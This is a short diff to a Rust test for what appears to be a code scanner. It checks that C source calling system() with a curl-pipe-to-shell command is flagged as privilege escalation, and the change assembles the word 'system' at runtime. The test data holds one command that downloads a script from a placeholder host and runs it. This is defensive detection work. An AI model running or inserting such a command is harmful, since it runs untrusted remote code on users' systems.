@@ -1174,7 +1174,7 @@ mod tests {
             "a workflow step is a shell script"
         );
         assert_eq!(
-            ids(&scan_text("src/main.c", "system(\"curl https://x.y/i.sh | sh\");\n", Kind::Repo)),
+            ids(&scan_text("src/main.c", &format!("{}(\"curl https://x.y/i.sh | sh\");\n", "system"), Kind::Repo)),
             [("SUSPECT-PRIV-ESCALATION", true)],
             "native code that spawns a shell"
         );
